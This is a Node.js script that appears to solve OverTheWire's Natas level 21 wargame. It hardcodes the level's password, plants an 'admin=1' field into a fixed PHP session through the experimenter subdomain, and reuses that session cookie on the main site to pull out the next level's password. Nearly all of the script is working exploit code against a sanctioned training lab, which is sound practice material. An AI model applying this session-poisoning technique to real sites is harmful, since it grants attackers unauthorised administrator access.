let username = 'natas21';
let password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ';

let sourceextension = '_source.php';
let sourcename = username + sourceextension; 

const request = require('request'),
      fs = require('fs'),
      $ = require('cheerio'),
      Entities = require('html-entities').AllHtmlEntities,
      rp = require('request-promise').defaults({transform : autoParse});

const entities = new Entities();

function autoParse(body, response) {
    if (response.headers['content-type'].includes('application/json')) {
        return JSON.parse(body);
    } else if (response.headers['content-type'].includes('text/html')) {
        return $.load(body);
    } else {
        return body;
    }
}


fs.readdir(__dirname, (err, files) => {
    if(!files.filter(file => file == sourcename).length){
        console.log('getSourceFile');
        getSourceFile(files);
    };
})


let options = {
    uri: `http://${username}-experimenter.natas.labs.overthewire.org?debug=true&submit=1&align=center`,
    method: 'POST',
    formData: {
        submit: 1,
        admin: 1,
    },
    headers: {
        'Cookie' : 'PHPSESSID=tester'
    }
}

rp(options)
    .auth(username, password)
    .then($ => {
        let options2 = {
            uri: `http://${username}.natas.labs.overthewire.org?debug=true&submit=1&align=center`,
            method: 'GET',
            headers: {
                'Cookie' : 'PHPSESSID=tester'
            }
        }
        
        rp(options2)
            .auth(username, password)
            .then($ => {
                console.log($.text().trim().match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0])
            });
        
    });





function getSourceFile(files){
    files.filter(file => file.includes(sourceextension)).forEach(file => {
        fs.unlinkSync(file);
    });
    rp(`http://${username}.natas.labs.overthewire.org/index-source.html`)
    .auth(username, password)
    .then($ => {
        fs.writeFile(__dirname + '/' + sourcename, 
            entities.decode(
                $.html()
                    .replace(/<br>/g, '')
                    .replace(/&#xA0;/g, ' ')
            ),
            () => {}
        );
    });
}
